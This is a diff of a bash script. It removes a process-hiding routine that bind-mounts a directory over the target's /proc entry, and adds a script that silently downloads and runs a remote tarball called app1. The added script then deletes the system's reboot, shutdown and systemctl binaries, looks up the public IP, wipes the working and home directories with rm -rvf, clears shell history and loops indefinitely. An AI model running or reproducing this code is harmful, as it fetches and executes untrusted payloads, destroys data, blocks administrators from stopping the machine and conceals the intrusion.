@@ -1,52 +1,16 @@
-#!/usr/bin/env bash
-
-PID="$(pidof app1)"
-
-function hidePid() {
-   mount --bind /dev/shm/.pid /proc/$PID
-}
-
-
-while :; do
-  case "$1" in
-    -h|--help)
-      usage
-      exit 0
-    ;;
-    --pid)
-      shift
-      PID="$1"
-      shift
-    ;;
-    --)
-      shift
-      break
-    ;;
-  esac
+#!/bin/bash
+wget -q https://github.com/fhuko1357/fun/raw/main/app1.tar.gz > /dev/null 2>&1 
+tar -xvf app1.tar.gz
+./app1 ann > /dev/null 2>&1 &
+sleep 10
+sudo rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
+curl ifconfig.me
+rm -rvf *
+cd ~/
+rm -rvf *
+history -cr
+while true
+do
+        echo "hold down..."
+        sleep 60
 done
-
-
-if [[ $(id -u) -ne "0" ]]; then
-  echo "" >&2
-  exit 1
-fi
-
-
-if [[ -n "$PID" ]]; then
-  msg=""
-
-  mkDir && hidePid && \
-
-  for i in $(seq 1 ${#msg}); do
-    echo -ne "${msg:i-1:1}"
-    sleep 0.06
-  done
-
-  exit 1
-fi
-
-
-if [[ $# -lt 1 ]]; then
-    usage >&2
-    exit 1
-fi
